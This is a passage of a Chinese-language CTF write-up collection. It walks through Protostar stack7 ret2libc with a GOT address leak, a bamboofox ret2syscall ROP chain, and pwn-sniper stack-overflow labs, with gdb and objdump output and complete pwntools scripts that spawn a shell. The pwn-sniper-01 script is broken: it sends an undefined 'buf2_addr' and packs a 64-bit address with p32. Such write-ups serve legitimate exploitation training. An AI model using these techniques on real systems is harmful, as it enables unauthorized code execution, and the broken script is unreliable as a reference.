AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0x804a9c0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\nEBX: 0xf7f95e14 --&gt; 0x232d0c ('\\x0c-#')\nECX: 0x0 \nEDX: 0x804aa89 --&gt; 0x79000000 ('')\nESI: 0x8048570 (&lt;__libc_csu_init&gt;:      push   ebp)\nEDI: 0xf7ffcb60 --&gt; 0x0 \nEBP: 0x41344141 ('AA4A')\nESP: 0xffffce90 (\"fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\nEIP: 0x41414a41 ('AJAA')\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41414a41\n[------------------------------------stack-------------------------------------]\n0000| 0xffffce90 (\"fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0004| 0xffffce94 (\"AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0008| 0xffffce98 (\"AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0012| 0xffffce9c (\"6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0016| 0xffffcea0 (\"AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0020| 0xffffcea4 (\"A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0024| 0xffffcea8 (\"MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0028| 0xffffceac (\"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x41414a41 in ?? ()\ngdb-peda$ pattern_offset 0x41414a41\n1094797889 found at offset: 80\n</code></pre> <p>\u6cc4\u6f0flibc\u51fd\u6570\u5730\u5740\uff08\u9009\u62e9\u6cc4\u6f0fgets\u51fd\u6570\u7684\u5730\u5740\uff09</p> <pre><code>\u2514\u2500$ objdump -R stack7\n\nstack7:     file format elf32-i386\n\nDYNAMIC RELOCATION RECORDS\nOFFSET   TYPE              VALUE\n08049738 R_386_GLOB_DAT    __gmon_start__\n08049780 R_386_COPY        stdout@GLIBC_2.0\n08049748 R_386_JUMP_SLOT   __gmon_start__\n0804974c R_386_JUMP_SLOT   gets@GLIBC_2.0\n08049750 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0\n08049754 R_386_JUMP_SLOT   _exit@GLIBC_2.0\n08049758 R_386_JUMP_SLOT   fflush@GLIBC_2.0\n0804975c R_386_JUMP_SLOT   printf@GLIBC_2.0\n08049760 R_386_JUMP_SLOT   strdup@GLIBC_2.0\n</code></pre> <pre><code>\u2514\u2500$ objdump -d stack7 | grep \"printf@plt\"\n080483e4 &lt;printf@plt&gt;:\n 80484d2:       e8 0d ff ff ff          call   80483e4 &lt;printf@plt&gt;\n 8048513:       e8 cc fe ff ff          call   80483e4 &lt;printf@plt&gt;\n 8048533:       e8 ac fe ff ff          call   80483e4 &lt;printf@plt&gt;\n</code></pre> <pre><code>\u2514\u2500$ objdump -s -j .rodata stack7\n\n\nstack7:     file format elf32-i386\n\nContents of section .rodata:\n 8048618 03000000 01000200 696e7075 74207061  ........input pa\n 8048628 74682070 6c656173 653a2000 627a7a7a  th please: .bzzz\n 8048638 74202825 70290a00 676f7420 70617468  t (%p)..got path\n 8048648 2025730a 00                           %s..   \n</code></pre> <pre><code>\u5730\u5740\u4fe1\u606f\u5982\u4e0b\uff1a\ngets@GOT = 0804974c\nprintf@plt = 080483e4\n\"%s\" = 8048648\nmain_addr = 08048545\n</code></pre> <p>\u6808\u5e03\u5c40\u5982\u4e0b\uff1a</p> <pre><code>+------------------+\n|   \u7f13\u51b2\u533a\u586b\u5145     | 80 bytes\n+------------------+\n|   printf@plt     | \u8986\u76d6\u8fd4\u56de\u5730\u5740\n+------------------+\n|   main \u5730\u5740      | printf \u7684\u8fd4\u56de\u5730\u5740\n+------------------+\n|   \u683c\u5f0f\u5b57\u7b26\u4e32\u5730\u5740 | printf \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\n+------------------+\n|   gets GOT \u5730\u5740  | printf \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\n+------------------+\n</code></pre> <p>\u6cc4\u6f0f\u5730\u5740\u7684\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>from pwn import *\n\ncontext(arch='i386', os='linux')\n\np = process('/opt/protostar/bin/stack7')\n\noffset = 80\nprintf_plt = 0x080483e4\nmain_addr = 0x08048545\ngets_got = 0x0804974c\n\n# \u7b2c\u4e00\u6b65\uff1a\u6cc4\u9732 gets \u5730\u5740\npayload = b'A' * offset\npayload += p32(printf_plt)      # \u8fd4\u56de\u5230 printf\npayload += p32(main_addr)        # printf \u8fd4\u56de\u540e\u56de\u5230 main\npayload += p32(0x08048648)       # \u683c\u5f0f\u5b57\u7b26\u4e32 \" %s\\n\"\npayload += p32(gets_got)         # \u8981\u6cc4\u9732\u7684 GOT \u5730\u5740\n\nprint(\"[*] Sending leak payload...\")\np.sendline(payload)\n\n# \u63a5\u6536\u7b2c\u4e00\u6b21\u7684\u8f93\u51fa\np.recvuntil(b\"got path \")\np.recvline()  # \u63a5\u6536\u5305\u542b\u5f88\u591a A \u7684\u90a3\u4e00\u884c\n\np.recv(1)  # \u63a5\u6536\u7a7a\u683c\nleaked_gets = u32(p.recv(4))\nprint(f\"[+] Leaked gets address: {hex(leaked_gets)}\")\n\n'''\n\u793a\u4f8b\u8f93\u51fa\u5982\u4e0b\uff1a\n\u2514\u2500$ python addr.py\n[+] Starting local process '/opt/protostar/bin/stack7': pid 23206\n[*] Sending leak payload...\n[+] Leaked gets address: 0xf7cf9670\n[*] Stopped process '/opt/protostar/bin/stack7' (pid 23206)\n'''\n</code></pre> <p>\u83b7\u53d6libc\u51fd\u6570\u504f\u79fb\u5730\u5740</p> <pre><code>\u5e38\u7528\u4e24\u79cd\u65b9\u5f0f\uff1a\n\n\n\u2514\u2500$ ldd stack7\n        linux-gate.so.1 (0xf7ee8000)\n        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7c86000)\n        /lib/ld-linux.so.2 (0xf7eea000)\n\n\n1\u3001readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep gets\n\n2\u3001objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep gets\n</code></pre> <p>\u7ee7\u7eed\u8ba1\u7b97libc\u57fa\u5730\u5740</p> <pre><code>libc_base = leaked_gets - gets_offset\nsystem_addr = libc_base + system_offset\nbinsh_addr = libc_base + binsh_offset\n</code></pre> <p>\u7531\u4e8estack7\u4e2d\u68c0\u67e5ret\u8fd4\u56de\u5730\u5740\u7684\u8303\u56f4\u662f0xb0000000\uff0c\u6bd4stack6\u4e2d0xbf000000\u8986\u76d6\u9762\u66f4\u5927 \u6240\u4ee5\u76f4\u63a5\u5c06\u8fd4\u56de\u5730\u5740\u8986\u76d6\u4e3asystem\u7684\u5730\u5740\uff0c\u5c31\u4f1a\u5bfc\u81f4\u8fd4\u56de\u5730\u5740\u68c0\u67e5\u88ab\u89e6\u53d1\uff0c\u8f93\u51fabzzzt\u5e76\u9000\u51fa</p> <p>\u6240\u4ee5\u4e0d\u53ef\u4ee5\u76f4\u63a5\u5c06\u8fd4\u56de\u5730\u5740\u8986\u76d6\u4e3asystem\u5730\u5740\uff0c\u800c\u662f\u5148\u8986\u76d6\u4e3a.text\u6bb5\uff08\u4e0d\u4f1a\u89e6\u53d1\u68c0\u67e5\uff09\u7684\u4e00\u4e2aret\u5730\u5740\uff0c\u518d\u8df3\u8f6c\u5230system \u5176\u6808\u5e03\u5c40\u5982\u4e0b\uff1a</p> <pre><code>+------------------+\n|   \u7f13\u51b2\u533a\u586b\u5145     | 80 bytes ('A'*80)\n+------------------+\n|   ret gadget     | \u8986\u76d6\u7684\u8fd4\u56de\u5730\u5740 (0x08048553)\n+------------------+\n|   system \u5730\u5740    | ret gadget \u6267\u884c\u540e\u7684\u8fd4\u56de\u5730\u5740\n+------------------+\n|   \u865a\u5047\u8fd4\u56de\u5730\u5740   | system \u7684\u8fd4\u56de\u5730\u5740 (0x41414141)\n+------------------+\n|   /bin/sh \u5730\u5740   | system \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\n+------------------+\n</code></pre> <p>\u4e0b\u9762\u662f\u5b8c\u6574\u7684exp:</p> <pre><code>from pwn import *\n\ncontext(arch='i386', os='linux')\n\np = process('/opt/protostar/bin/stack7')\n\noffset = 80\nprintf_plt = 0x080483e4\nmain_addr = 0x08048545\ngets_got = 0x0804974c\n\n# \u7b2c\u4e00\u6b65\uff1a\u6cc4\u9732 gets \u5730\u5740\npayload = b'A' * offset\npayload += p32(printf_plt)      # \u8fd4\u56de\u5230 printf\npayload += p32(main_addr)        # printf \u8fd4\u56de\u540e\u56de\u5230 main\npayload += p32(0x08048648)       # \u683c\u5f0f\u5b57\u7b26\u4e32 \" %s\\n\"\npayload += p32(gets_got)         # \u8981\u6cc4\u9732\u7684 GOT \u5730\u5740\n\nprint(\"[*] Sending leak payload...\")\np.sendline(payload)\n\n# \u63a5\u6536\u8f93\u51fa\np.recvuntil(b\"got path \")\np.recvline()  # \u63a5\u6536\u5305\u542b A \u7684\u90a3\u4e00\u884c\n\np.recv(1)  # \u63a5\u6536\u7a7a\u683c\nleaked_gets = u32(p.recv(4))\nprint(f\"[+] Leaked gets address: {hex(leaked_gets)}\")\n\n# \u7b49\u5f85\u4e0b\u4e00\u4e2a\u8f93\u5165\u63d0\u793a\np.recvuntil(b\"input path please: \")\n\n# \u7b2c\u4e8c\u6b65\uff1a\u8ba1\u7b97\u5730\u5740\nlibc = ELF('/lib/i386-linux-gnu/libc.so.6')\ngets_offset = libc.symbols['gets']\nsystem_offset = libc.symbols['system']\nbinsh_offset = next(libc.search(b'/bin/sh'))\n\nlibc_base = leaked_gets - gets_offset\nsystem_addr = libc_base + system_offset\nbinsh_addr = libc_base + binsh_offset\n\nprint(f\"[+] Libc base: {hex(libc_base)}\")\nprint(f\"[+] System address: {hex(system_addr)}\")\nprint(f\"[+] /bin/sh address: {hex(binsh_addr)}\")\n\n# \u627e\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684 ret gadget\n# \u53ef\u4ee5\u7528\u8fd9\u4e2a\u547d\u4ee4\u67e5\u627e\uff1aobjdump -d stack7 | grep -A1 \"ret\"\nret_gadget = 0x08048553  # \u8fd9\u662f main \u51fd\u6570\u4e2d\u7684 ret \u6307\u4ee4\n\n# \u7b2c\u4e09\u6b65\uff1a\u4f7f\u7528 ret gadget \u8fdb\u884c ret2libc\npayload2 = b'A' * offset\npayload2 += p32(ret_gadget)      # \u5148\u8fd4\u56de\u5230 ret gadget\npayload2 += p32(system_addr)     # \u7136\u540e\u5230 system\npayload2 += p32(0x41414141)      # system \u7684\u5047\u8fd4\u56de\u5730\u5740\npayload2 += p32(binsh_addr)      # system \u7684\u53c2\u6570\n\nprint(\"[*] Sending ret2libc payload...\")\np.sendline(payload2)\n\n# \u83b7\u53d6 shell\np.interactive()\n</code></pre> <p></p>"},{"location":"pwn/bamboofox-ret2syscall-rop/","title":"bamboofox-ret2syscall-rop","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nchar *shell = \"/bin/sh\";\n\nint main(void)\n{\n    setvbuf(stdout, 0LL, 2, 0LL);\n    setvbuf(stdin, 0LL, 1, 0LL);\n\n    char buf[100];\n\n    printf(\"This time, no system() and NO SHELLCODE!!!\\n\");\n    printf(\"What do you plan to do?\\n\");\n    gets(buf);\n\n    return 0;\n}\n</code></pre> <p>\u68c0\u67e5\u4fdd\u62a4</p> <p>\u53ef\u4ee5\u770b\u5230\u5f00\u542f\u4e86NX\uff08\u4e0d\u53ef\u6267\u884c\uff09\u4fdd\u62a4</p> <pre><code>\u2514\u2500# checksec rop    \n[*] '/root/pwn/rop'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>\u67e5\u770b\u6e90\u7801</p> <p></p> <p>\u7531\u4e8e\u5f00\u542f\u4e86NX\u4fdd\u62a4\uff0c\u65e0\u6cd5\u5c06shellcode\u90e8\u7f72\u5230\u5185\u5b58\u4e2d\uff0c\u6545\u800c\u5c1d\u8bd5\u8c03\u7528\u7cfb\u7edf\u51fd\u6570\u83b7\u5f97shell</p> <p>\u5c1d\u8bd5\u901a\u8fc7\u6ea2\u51fa\u8c03\u7528\u6267\u884c<code>execve(\"/bin/sh\",NULL,NULL)</code>\u83b7\u5f97shell</p> <p><code>execve(\"/bin/sh\",NULL,NULL)</code>\u7684\u6307\u4ee4\u5982\u4e0b</p> <pre><code>mov eax, 0xb\n\nmov ebx, [\u201c/bin/sh\u201d]\n\nmov ecx, 0\n\nmov edx, 0\n\nint 0x80\n</code></pre> <p>x86 \u901a\u8fc7 int 0x80 \u6307\u4ee4\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528</p> <p>amd64 \u901a\u8fc7 syscall \u6307\u4ee4\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528</p> <p>\u8fd9\u91cc\u4f7f\u7528ropgadget\u5bfb\u627e\u5408\u9002\u7684\u7247\u6bb5</p> <p>\u9996\u5148\u67e5\u627eeax</p> <pre><code>\u2514\u2500# ROPgadget --binary rop --only='pop|ret' |grep 'eax'\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x080bb196 : pop eax ; ret\n0x0807217a : pop eax ; ret 0x80e\n0x0804f704 : pop eax ; ret 3\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n</code></pre> <p>\u8fd9\u91cc\u9009\u62e9 <code>0x080bb196 : pop eax ; ret</code></p> <p>\u63a5\u4e0b\u6765\u5bfb\u627eebx,ecx,edx</p> <pre><code>\u2514\u2500# ROPgadget --binary rop --only='pop|ret' |grep 'ebx'\n0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret\n0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret\n0x080be23f : pop ebx ; pop edi ; ret\n0x0806eb69 : pop ebx ; pop edx ; ret\n0x08092258 : pop ebx ; pop esi ; pop ebp ; ret\n0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10\n0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14\n0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4\n0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8\n0x08048913 : pop ebx ; pop esi ; pop edi ; ret\n0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4\n0x08049a94 : pop ebx ; pop esi ; ret\n0x080481c9 : pop ebx ; ret\n0x080d7d3c : pop ebx ; ret 0x6f9\n0x08099c87 : pop ebx ; ret 8\n0x0806eb91 : pop ecx ; pop ebx ; ret\n0x0806336b : pop edi ; pop esi ; pop ebx ; ret\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret\n0x0805c820 : pop esi ; pop ebx ; ret\n0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0807b6ed : pop ss ; pop ebx ; ret\n</code></pre> <p>\u8fd9\u91cc\u9009\u62e9<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code> \uff0c\u53ef\u4ee5\u4e00\u6b21\u6027\u63a7\u5236ebx,ecx,edx\u4e09\u4e2a\u5bc4\u5b58\u5668</p> <p>\u63a5\u4e0b\u6765\u5bfb\u627e/bin/sh\u5b57\u6bb5</p> <pre><code>\u2514\u2500# ROPgadget --binary rop --string='/bin/sh'           \nStrings information\n============================================================\n0x080be408 : /bin/sh\n</code></pre> <p>\u6700\u540e\u5bfb\u627e\u4e2d\u65ad\u6307\u4ee4int 0x80</p> <pre><code>\u2514\u2500# ROPgadget --binary rop --only='int'     \nGadgets information\n============================================================\n0x08049421 : int 0x80\n</code></pre> <p>\u6240\u4ee5\u603b\u7684\u5c31\u662f</p> <pre><code>from pwn import *\n\nsh = process('./rop')\n\npop_eax_ret = 0x080bb196\npop_edx_ecx_ebx_ret = 0x0806eb90\nint_0x80 = 0x08049421\nbin_sh = 0x80be408\npayload = flat([b'a' * 0x70,  pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])\nsh.sendline(payload)\nsh.interactive()\n</code></pre> <p>\u6267\u884c\u7ed3\u679c\u5982\u4e0b\u6240\u793a</p> <p></p>"},{"location":"pwn/pwn-sniper-01/","title":"pwn-sniper-01","text":"<p>\u6f0f\u6d1e\u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\n// \u6808\u6ea2\u51fa\u540e\u6267\u884c\u7684\u51fd\u6570\nvoid bingo(){\n    system(\"/bin/sh\"); // \u8c03\u7528 system \u51fd\u6570\u542f\u52a8 /bin/sh \u6765\u83b7\u53d6 shell\n}\n\nint main(){\n    char buffer[36] = {0}; // \u5b9a\u4e49 36 \u4e2a\u5b57\u7b26(\u5b57\u8282)\u957f\u5ea6\u7684\u5b57\u7b26\u6570\u7ec4 , \u5e76\u5168\u90e8\u521d\u59cb\u5316\u4e3a 0\n    puts(\"Tell my why : \");\n    /* \u6ea2\u51fa\u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u5c31\u662f\u56e0\u4e3a read \u51fd\u6570\u5e76\u6ca1\u6709\u5bf9 buffer \u6570\u7ec4\u7684\u8303\u56f4\u8fdb\u884c\u68c0\u67e5 \n     * \u5982\u679c\u6211\u4eec\u5411\u6807\u51c6\u8f93\u5165\u6d41\u4e2d\u8f93\u5165\u4e86\u8d85\u51fa buffer \u8303\u56f4 (36\u4e2a\u5b57\u8282) \u7684\u6570\u636e , \u90a3\u4e48\u5199\u64cd\u4f5c\u5e76\u4e0d\u4f1a\u505c\u6b62 , \u800c\u662f\u4f1a\u7ee7\u7eed\u5411\u5185\u5b58\u4e2d\u5199\u5165\u6570\u636e , \u800c\u8fd9\u4e9b\u6570\u636e\u5c31\u662f\u7531\u6211\u4eec\u63a7\u5236\u7684\n     * \u6211\u4eec\u77e5\u9053 , buffer \u6570\u7ec4\u662f\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\u7684\u6808\u6bb5\u4e2d\u7684 , \u800c main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e5f\u662f\u4fdd\u5b58\u5728\u6808\u6bb5\u4e2d\u7684\n     * \u56e0\u6b64 , \u6211\u4eec\u53ea\u9700\u8981\u63a7\u5236\u5199\u5165\u7684\u6570\u636e , \u5c06 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u8986\u76d6\n     * \u8fd9\u6837 , \u5728\u4e3b\u51fd\u6570\u6267\u884c\u7ed3\u675f\u540e , \u4f1a pop \u6808\u4e2d\u4fdd\u5b58\u7684\u4e3b\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740 (\u4e8b\u5b9e\u4e0a\u5df2\u7ecf\u88ab\u6211\u4eec\u5199\u5165\u7684\u6570\u636e\u8986\u76d6) \u5230 eip \u5bc4\u5b58\u5668\u4e2d\n     * cpu \u5c31\u4f1a\u4e0d\u4f1a\u8ba4\u4e3a\u7a0b\u5e8f\u5df2\u7ecf\u7ed3\u675f , \u800c\u662f\u7ee7\u7eed\u6839\u636e eip \u5bc4\u5b58\u5668\u6307\u5411\u7684\u5185\u5b58\u53d6\u6307\u4ee4\u6267\u884c , \u8fd9\u6837\u6211\u4eec\u5c31\u8fbe\u5230\u4e86\u53ef\u4ee5\u4efb\u610f\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u76ee\u7684\n     * \u56e0\u6b64 , \u6211\u4eec\u4e3a\u4e86\u80fd\u83b7\u53d6\u4e00\u4e2a shell , \u6211\u4eec\u9700\u8981\u5c06\u4e3b\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u8986\u76d6\u4e3a bingo \u51fd\u6570\u7684\u5730\u5740\n     * \u7136\u540e\u7a0b\u5e8f\u7ee7\u7eed\u6267\u884c\u4e4b\u540e\u9047\u5230 return 0 \u5c31\u4f1a\u76f4\u63a5\u8df3\u8f6c\u5230 bingo \u51fd\u6570 , \u4ece\u800c\u8fd0\u884c /bin/sh , \u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u76ee\u6807\u4e3b\u673a\u7684 shell\n     * \u7531\u4e8e\u65f6\u95f4\u5173\u7cfb , \u8fd9\u91cc\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u5728\u672c\u673a\u8fdb\u884c , \u8fdc\u7a0b\u64cd\u4f5c\u4e5f\u662f\u540c\u6837\u7684\u9053\u7406 , \u56e0\u6b64\u4e0d\u518d\u8d58\u8ff0\n     */\n    read(0, buffer, 0xFF); // \u4f7f\u7528 read \u51fd\u6570\u5c06\u6807\u51c6\u8f93\u5165\u6d41\u4e2d\u7684\u6570\u636e\u590d\u5236\u5230 buffer \u5b57\u7b26\u6570\u7ec4\n    printf(\"Good boy : %s\\n\", buffer); // \u6253\u5370\u5b57\u7b26\u6570\u7ec4\u7684\u957f\u5ea6\n    return 0; // \u4e3b\u51fd\u6570\u8fd4\u56de\n}\n</code></pre> <p>\u7f16\u8bd1\u9009\u9879\u5982\u4e0b\uff1a</p> <pre><code>a.out:hello.c\n    gcc -g -fno-stack-protector hello.c\nclean:\n    rm ./a.out\n</code></pre> <p>checksec</p> <pre><code>\u2514\u2500$ checksec --file=./a.out\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols        No    0               2               ./a.out\n</code></pre> <p>objdump</p> <pre><code>\u2514\u2500$ objdump -t -j .text a.out \n\na.out:     file format elf64-x86-64\n\nSYMBOL TABLE:\n0000000000400500 l    d  .text  0000000000000000              .text\n0000000000400530 l     F .text  0000000000000000              deregister_tm_clones\n0000000000400560 l     F .text  0000000000000000              register_tm_clones\n00000000004005a0 l     F .text  0000000000000000              __do_global_dtors_aux\n00000000004005c0 l     F .text  0000000000000000              frame_dummy\n00000000004006e0 g     F .text  0000000000000002              __libc_csu_fini\n00000000004005ed g     F .text  0000000000000010              bingo\n0000000000400670 g     F .text  0000000000000065              __libc_csu_init\n0000000000400500 g     F .text  000000000000002a              _start\n00000000004005fd g     F .text  000000000000006c              main\n</code></pre> <p>\u4f7f\u7528gdb\u8fdb\u884c\u8c03\u8bd5</p> <pre><code>gdb-peda$ disass main\nDump of assembler code for function main:\n   0x00000000004005fd &lt;+0&gt;:     push   rbp\n   0x00000000004005fe &lt;+1&gt;:     mov    rbp,rsp\n   0x0000000000400601 &lt;+4&gt;:     sub    rsp,0x30\n   0x0000000000400605 &lt;+8&gt;:     mov    QWORD PTR [rbp-0x30],0x0\n   0x000000000040060d &lt;+16&gt;:    mov    QWORD PTR [rbp-0x28],0x0\n   0x0000000000400615 &lt;+24&gt;:    mov    QWORD PTR [rbp-0x20],0x0\n   0x000000000040061d &lt;+32&gt;:    mov    QWORD PTR [rbp-0x18],0x0\n   0x0000000000400625 &lt;+40&gt;:    mov    DWORD PTR [rbp-0x10],0x0\n   0x000000000040062c &lt;+47&gt;:    mov    edi,0x4006fc\n   0x0000000000400631 &lt;+52&gt;:    call   0x4004a0 &lt;puts@plt&gt;\n   0x0000000000400636 &lt;+57&gt;:    lea    rax,[rbp-0x30]\n   0x000000000040063a &lt;+61&gt;:    mov    edx,0xff\n   0x000000000040063f &lt;+66&gt;:    mov    rsi,rax\n   0x0000000000400642 &lt;+69&gt;:    mov    edi,0x0\n   0x0000000000400647 &lt;+74&gt;:    call   0x4004d0 &lt;read@plt&gt;\n   0x000000000040064c &lt;+79&gt;:    lea    rax,[rbp-0x30]\n   0x0000000000400650 &lt;+83&gt;:    mov    rsi,rax\n   0x0000000000400653 &lt;+86&gt;:    mov    edi,0x40070b\n   0x0000000000400658 &lt;+91&gt;:    mov    eax,0x0\n   0x000000000040065d &lt;+96&gt;:    call   0x4004c0 &lt;printf@plt&gt;\n   0x0000000000400662 &lt;+101&gt;:   mov    eax,0x0\n   0x0000000000400667 &lt;+106&gt;:   leave\n   0x0000000000400668 &lt;+107&gt;:   ret\nEnd of assembler dump.\n</code></pre> <pre><code>gdb-peda$ disass bingo\nDump of assembler code for function bingo:\n   0x00000000004005ed &lt;+0&gt;:     push   rbp\n   0x00000000004005ee &lt;+1&gt;:     mov    rbp,rsp\n   0x00000000004005f1 &lt;+4&gt;:     mov    edi,0x4006f4\n   0x00000000004005f6 &lt;+9&gt;:     call   0x4004b0 &lt;system@plt&gt;\n   0x00000000004005fb &lt;+14&gt;:    pop    rbp\n   0x00000000004005fc &lt;+15&gt;:    ret\nEnd of assembler dump.\n</code></pre> <p>\u4ece<code>main</code>\u51fd\u6570\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c\u5b58\u50a8\u8f93\u5165\u6570\u636e\u7684\u504f\u79fb\u5730\u5740\u4e3a<code>[rbp-0x30]</code></p> <p><code>bingo</code>\u51fd\u6570\u7684\u5730\u5740\u4e3a<code>0x4005ed</code></p> <p>\u636e\u6b64\u6784\u9020\u5229\u7528\u811a\u672c\uff0c\u5982\u4e0b\uff1a</p> <p>\u7531\u4e8e\u8be5\u7a0b\u5e8f\u4e3a64\u4f4d\uff0c\u5219\u6bb5\u57fa\u5730\u5740\u957f\u5ea6\u4e3a8\u4f4d\uff0c\u5219\u8986\u76d6\u957f\u5ea6\u4e3a48+8=56</p> <pre><code>from pwn import *\n\nsh = process('./a.out')\nkey = 0x4005ed\n\nsh.sendline(b'a'*56 + p32(buf2_addr))\nsh.interactive()\n</code></pre> <p></p>"},{"location":"pwn/pwn-sniper-02/","title":"pwn-sniper-02","text":"<p>\u6f0f\u6d1e\u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(){\n        char buffer[0x50] = {0}; // \u5b9a\u4e49\u4e00\u4e2a 0x50 = 80 \u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u6570\u7ec4 , \u5e76\u5168\u90e8\u521d\u59cb\u5316\u4e3a 0 \n        printf(\"&amp;buffer = %p\\n\", &amp;buffer); // \u6253\u5370\u5b57\u7b26\u6570\u7ec4\u5728\u5185\u5b58(\u6808\u6bb5)\u4e2d\u7684\u5730\u5740\n        fflush(stdout); // \u5237\u65b0\u7f13\u51b2\u533a\n        read(0, buffer, 0xFF); // \u4f7f\u7528 read \u51fd\u6570\u5c06\u7f13\u51b2\u533a\u4e2d\u7684 0xFF \u5b57\u8282\u957f\u5ea6\u7684\u6570\u636e\u8bfb\u53d6\u5230 buffer \u6570\u7ec4\u4e2d , \u4ee5\u6362\u884c\u7b26\u7ed3\u675f\n        printf(\"Content of buffer : %s\\n\", buffer); // \u6253\u5370 buffer \u7684\u503c\n        return 0; // 